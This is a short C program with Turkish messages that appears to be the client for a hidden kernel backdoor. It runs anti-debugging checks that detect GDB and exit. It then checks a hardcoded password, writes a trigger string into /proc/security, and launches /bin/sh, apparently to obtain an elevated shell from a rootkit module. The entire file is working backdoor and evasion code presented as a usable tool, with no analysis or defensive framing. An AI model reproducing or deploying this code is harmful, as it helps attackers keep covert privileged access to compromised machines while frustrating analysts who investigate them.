#include <sys/ptrace.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <sys/wait.h>

#define ANAHTAR "fabrika"

char *hosgeldin = "\n Sistem yetki unitesi\n";




/*
void check(void) __attribute__((constructor));

void check(void)
{
   if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {
       printf("Bir Bulutla KI$ Gelmez!\n");
       _exit(-1);
   }
}
*/


void detect_gdb(void) __attribute__((constructor)); // More GDB Anti-Debugging 
/////////////////////////////////more information-> http://xorl.wordpress.com/2009/01/05/more-gdb-anti-debugging/
void detect_gdb(void)
{
        FILE *fd = fopen("/tmp", "r");
        if (fileno(fd) > 5)
        {
           printf("Bir Bulutla KI$ Gelmez!\n");
           _exit(1);
        }
        fclose(fd);
}


int main(int argc, char *argv[]) {


char *sifrem;
sifrem = argv[1];

if(argc != 2)

    {
        printf("%s", hosgeldin);
        printf("\nKullanim: %s <sifre> \n\n ", argv[0]);
        return 0;
}

if((strcmp(sifrem,ANAHTAR) != 0) )
    {
        printf("\nSifre yanlis!\n\n");
        return 0;
}

FILE *f;

f = fopen("/proc/security", "r");
if(!f)
{
printf("\n/proc/security dosyasi bulunamadi\n");
return 0;
}
fclose(f);


execl("/bin/sh","/bin/sh","-c","echo fabrika /bin/sh >>/proc/security ;/bin/sh", (char*) 0);


}

